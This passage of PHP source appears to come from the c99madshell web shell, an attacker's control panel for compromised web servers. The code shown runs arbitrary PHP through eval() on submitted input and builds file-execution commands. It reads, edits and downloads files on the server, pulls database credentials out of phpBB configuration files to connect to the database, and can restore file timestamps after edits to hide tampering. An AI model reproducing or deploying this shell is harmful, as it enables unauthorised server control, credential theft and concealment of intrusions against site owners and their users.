   if ($parsesort[1] != "a") {$y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."a\"';document.todo.submit();\">!</a>";}
   else {$y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."d\"';document.todo.submit();\">!</a>";}
   if ($k > count($head)) {$k = count($head)-1;}
   for($i=0;$i<count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$i.$parsesort[1]."a\"';document.todo.submit();\"><b>".trim($head[$i])."</b></a>";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
    {
     echo "<tr>";
     $line = explode("        ",$line);
     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
     $line[2] = intval(str_replace(" ","",$line[2]))*1024;
     $prcs[] = $line;
     echo "</tr>";
    }
   }
  }
  $head[$k] = "<b>".$head[$k]."</b>".$y;
  $v = $processes_sort[0];
  usort($prcs,"tabsort");
  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}
  $tab = array();
  $tab[] = $head;
  $tab = array_merge($tab,$prcs);
  echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
  foreach($tab as $i=>$k)
  {
   echo "<tr>";
   foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";}
   echo "</tr>";
  }
  echo "</table>";
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Result of execution this PHP-code</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("\r\n",$ret))+1;
    if ($rows < 10) {$rows = 10;}
    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
   else {echo $ret."<br>";}
  }
  else
  {
   if ($eval_txt)
   {
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    eval($eval);
    echo "</textarea>";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='edit';document.todo.c.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><u>Create</u></a></center>";}
 }
 else
 {
  $r = @file_get_contents($d.$f);
  $ext = explode(".",$f);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $rft = "";
  foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
  if (empty($ft)) {$ft = $rft;}
  $arr = array(
   array("DIZ","info"),
   array("HTML","html"),
   array("TXT","txt"),
   array("Code","code"),
   array("Session","phpsess"),
   array("EXE","exe"),
   array("SDB","sdb"),
   array("INI","ini"),
   array("DOWNLOAD","download"),
   array("RTF","notepad"),
   array("EDIT","edit")
  );
  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
  foreach($arr as $t)
  {
   if ($t[1] == $rft) {echo " <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><font color=green>".$t[0]."</font></a>";}
   elseif ($t[1] == $ft) {echo " <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><b><u>".$t[0]."</u></b></a>";}
   else {echo " <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><b>".$t[0]."</b></a>";}
   echo " |";
  }
  echo "<hr size=\"1\" noshade>";
  if ($ft == "info")
  {
   echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
   if (!$win)
   {
    echo "<tr><td><b>Owner/Group</b></td><td> ";
    $ow = posix_getpwuid(fileowner($d.$f));
    $gr = posix_getgrgid(filegroup($d.$f));
    echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
   }
   echo "<tr><td><b>Perms</b></td><td><a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.f.value='".urlencode($f)."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";
   $fi = fopen($d.$f,"rb");
   if ($fi)
   {
    if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
    else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
    $n = 0;
    $a0 = "00000000<br>";
    $a1 = "";
    $a2 = "";
    for ($i=0; $i<strlen($str); $i++)
    {
     $a1 .= sprintf("%02X",ord($str[$i]))." ";
     switch (ord($str[$i]))
     {
      case 0:  $a2 .= "<font>0</font>"; break;
      case 32:
      case 10:
      case 13: $a2 .= "&nbsp;"; break;
      default: $a2 .= htmlspecialchars($str[$i]);
     }
     $n++;
     if ($n == $hexdump_rows)
     {
      $n = 0;
      if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
      $a1 .= "<br>";
      $a2 .= "<br>";
     }
    }
    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";}
    echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td><td bgcolor=000000>".$a2."</td></tr></table><br>";
   }
   $encoded = "";
   if ($base64 == 1)
   {
    echo "<b>Base64 Encode</b><br>";
    $encoded = base64_encode(file_get_contents($d.$f));
   }
   elseif($base64 == 2)
   {
    echo "<b>Base64 Encode + Chunk</b><br>";
    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
   }
   elseif($base64 == 3)
   {
    echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
    $encoded = base64_encode(file_get_contents($d.$f));
    $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
   }
   elseif($base64 == 4)
   {
    $text = file_get_contents($d.$f);
    $encoded = base64_decode($text);
    echo "<b>Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "</b><br>";
   }
   if (!empty($encoded))
   {
    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
   }
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.fullhexdump.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">Full</a>] [<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">Preview</a>]<br><b>Base64: </b>
<nobr>[<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">Encode</a>]&nbsp;</nobr>
<nobr>[<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='2';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">+chunk</a>]&nbsp;</nobr>
<nobr>[<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='3';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">+chunk+quotes</a>]&nbsp;</nobr>
<nobr>[<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='4';document.todo.d.value='".urlencode($d)."';document.todo.submit();\">Decode</a>]&nbsp;</nobr>
<P>";
  }
  elseif ($ft == "html")
  {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {c99shexit();}
  }
  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}
  elseif ($ft == "phpsess")
  {
   echo "<pre>";
   $v = explode("|",$r);
   echo $v[0]."<br>";
   var_dump(unserialize($v[1]));
   echo "</pre>";
  }
  elseif ($ft == "exe")
  {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=>$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "<b>Execute file:</b><form method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
  }
  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
  elseif ($ft == "code")
  {
   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
   {
    $arr = explode("\n",$r);
    if (count($arr == 18))
    {
     include($d.$f);
     echo "<b>phpBB configuration is detected in this file!<br>";
     if ($dbms == "mysql4") {$dbms = "mysql";}
     if ($dbms == "mysql") {echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($dbuser)."';document.sql.sql_passwd.value='".htmlspecialchars($dbpasswd)."';document.sql.sql_server.value='".htmlspecialchars($dbhost)."';document.sql.sql_port.value='3306';document.sql.sql_db.value='".htmlspecialchars($dbname)."';document.sql.submit();\"><b><u>Connect to DB</u></b></a><br><br>";}
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99madshell. Please, report us for fix.";}
     echo "Parameters for manual connect:<br>";
     $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
     foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
     echo "</b><hr size=\"1\" noshade>";
    }
   }
   echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
   if (!empty($white)) {@ob_clean();}
   highlight_file($d.$f);
   if (!empty($white)) {c99shexit();}
   echo "</div>";
  }
  elseif ($ft == "download")
  {
   @ob_clean();
   header("Content-type: application/octet-stream");
   header("Content-length: ".filesize($d.$f));
   header("Content-disposition: attachment; filename=\"".$f."\";");
   echo $r;
   exit;
  }
  elseif ($ft == "notepad")
  {
   @ob_clean();
   header("Content-type: text/plain");
   header("Content-disposition: attachment; filename=\"".$f.".txt\";");
   echo($r);
   exit;
  }
  elseif ($ft == "edit")
  {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>Can't write to file!</b>";}
    else
    {
     echo "<b>Saved!</b>";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form method=\"POST\"><input name='act' type='hidden' value='f'><input name='f' type='hidden' value='".urlencode($f)."'><input name='ft' type='hidden' value='edit'><input name='d' type='hidden' value='".urlencode($d)."'><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".addslashes(substr($d,0,-1))."';document.todo.submit();\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
 }
}
if ($act == "about") {echo "r00t";}
?><?php echo urlencode($d); ?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo $dispd; ?><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $shver; ?><?php echo round(getmicrotime()-starttime,4); ?><?php chdir($lastdir); c99shexit();
?>